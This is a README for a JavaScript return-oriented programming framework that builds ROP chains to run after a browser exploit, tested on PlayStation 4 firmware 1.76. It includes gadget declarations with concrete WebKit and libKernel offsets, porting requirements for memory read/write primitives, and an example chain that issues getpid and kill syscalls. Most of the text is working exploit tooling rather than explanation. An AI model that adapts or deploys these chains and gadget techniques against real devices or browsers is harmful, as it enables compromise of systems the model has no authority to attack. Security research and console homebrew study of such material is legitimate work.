# JuSt-ROP
JavaScript ROP framework. For directly writing ROP chains in JavaScript before executing them via a browser exploit.

All gadgets and chains shown here were tested on PlayStation 4 firmware 1.76. To use this with any other exploit you will need to make several manual tweaks (for 32bit, you should replace `* 8` with `* 4` for example).

## Porting to your exploits
Expose the following globally:
* `getU8(address)`, `getU64(address)`, and `setU64(address, value)`
* `stackBase`
* `returnAddress` (so `stackBase + returnAddress` points to the return value of a function)
* `moduleBases` (an array of module base addresses)

Then place your gadgets in the the `gadgets` array, using this syntax to declare a gadget:

    gadget(instructions, module, address)

For example:

    // moduleBases[webkit] is the base address of the webkit module
    var webkit = 14;
    var libKernel = 1;
    
    var gadgets = {
        "mov [rax], rcx": new gadget([0x48, 0x89, 0x08], webkit, 0x9ecde6),
        "mov [rax], rdx": new gadget([], webkit, 0x3579c0),
        "mov [rax], rsi": new gadget([], webkit, 0x2adea7),
        
        "mov [rdi], rax": new gadget([0x48, 0x89, 0x07], libKernel, 0xb0c8),
    }

The `instructions` parameter is optional, if it is non-empty then the memory at the gadget's pointer will be checked to ensure that it is correct (and followed by a `ret` instruction).

## Usage
Make sure to include `just-rop.js` before `gadgets.js` to avoid getting a reference error:

    <script type="text/javascript" src="just-rop.js"></script>
    <script type="text/javascript" src="gadgets.js"></script>

What you can do depends largely on what gadgets you have available, and the system that you are exploiting (sandboxing might disable some system calls for example).

Here's a simple example chain:

    var chain = new rop(stackBase + returnAddress + 0x420);
    
    var SIGKILL = 9;
    
    try {
        chain.syscall("getpid", 20);
        
        // rax is the return value
        chain.write_rax_ToVariable(0);
        
        chain.read_rdi_FromVariable(0);
        
        // rdi already has desired value so don't overwrite it
        chain.syscall("kill", 37, undefined, SIGKILL);
        
        chain.execute();
    }
    catch(e) {
        logAdd("Incorrect gadget address " + e.toString(16));
    }
    
    chain.logVariable(0);